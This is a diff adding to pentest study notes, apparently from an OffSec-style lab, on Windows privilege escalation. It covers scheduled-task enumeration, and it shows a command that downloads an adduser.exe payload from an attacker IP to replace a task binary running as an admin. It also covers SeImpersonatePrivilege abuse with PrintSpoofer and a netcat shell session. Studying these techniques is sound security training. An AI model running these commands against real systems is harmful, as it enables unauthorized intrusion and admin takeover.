@@ -1039,6 +1039,8 @@ We need to know 3 things to identify if privilege escalation is possible through
 - Triggers specified for the task - If a trigger was met in the past, the task will not run again in the future, or if the time trigger occurs after the deadline for our pentest (you should still mention this finding in your report)
 - Actions executed when one or more of the triggers are met - in most cases, we can use familiar tactics like replacing the binary or placing a missing DLL. We don't have a service binary for scheduled tasks, but we have programs and scripts specified by the actions.
 
+With the following two commands, look for interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields that answer one of the three items above.
+
 ```console
 PS C:\Users\steve> Get-ScheduledTask
 PS C:\Users\steve> schtasks /query /fo LIST /v
@@ -1068,3 +1070,84 @@ Start Date:                           7/4/2022
 ...
 ```
 
+We found one authored by daveadmin that runs every minute as daveadmin. We have extensive permissions to leverage this since the exe is located in a subdir of steve's home dir. 
+
+```console
+PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+```
+
+Use the adduser.exe binary to replace the file.
+
+```console
+PS C:\Users\steve> iwr -Uri http://192.168.45.245/adduser.exe -Outfile BackendCacheCleanup.exe
+
+PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+
+PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
+```
+
+Let the scheduled task execute again, and check if we achieved privilege escalation.
+
+```console
+PS C:\Users\steve> net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave2
+daveadmin
+offsec
+The command completed successfully.
+```
+
+### Using Exploits
+
+We will use three different types of exploits for privilege escalation:
+- Application-based vulnerabilities - installed apps can contain vulns as seen in "Locating Public Exploits". If the apps run with admin privs AND we are able to exploit a vuln that leads to code execution, we can elevate our privileges.
+- Windows Kernel Vulnerabilities - These are quite advanced, but exist and can be used for privilege escalation. These exploits can crash systems, so always have a good understanding of boundaries.
+- Windows Privilege abuse - Non-privileged users that have assigned privileges, like SeImpersonatePrivilege, can abuse those privileges. SeImpersonatePrivilege may let us leverage a token with another security context. A user with this privilege can perform ops in the security context of another user under the right circumstances. Windows default-assigns this privilege to the local Administrtors group, LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts. Other privileges that we can leverage for priv escalation include SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug.
+
+We'll often come across the SeImpersonatePrivilege when we gain code execution on a Win system by exploiting a vuln in an Internet Information Service (IIS) web server. Most configs of IIS run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity. All of these, as well as other Windows services, have the SeImpersonatePrivilege. 
+
+Named pipes are one method for local or remote Inter-Process Communication and allow two unrelated processes to share and transfer data with each other. A named pipe server can create a named pipe to which a named pipe client can connect via the specified name. The client and server can be on different systems. When a client connects to a named pipe, the server can leverage the SeImpersonatePrivilege to impersonate the client after capturing the authentication from their connection process.
+
+We need to find a privileged process and coerce it into connecting to a controlled named pipe. Once we impersonate the user connecting to the named pipe, we can operate with their privileges.
+
+Let's try PrintSpoofer to implement the printer bug and coerce NT Authority\SYSTEM into connecting to a controlled named pipe. We'll use this tool when we have code execution as a user with the SeImpersonatePrivilege to execute commands as NT AUTHORITY\SYSTEM.
+
+```console
+kali@kali:~$ nc 192.168.50.220 4444
+Microsoft Windows [Version 10.0.22000.318]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dave> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeSecurityPrivilege           Manage auditing and security log          Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
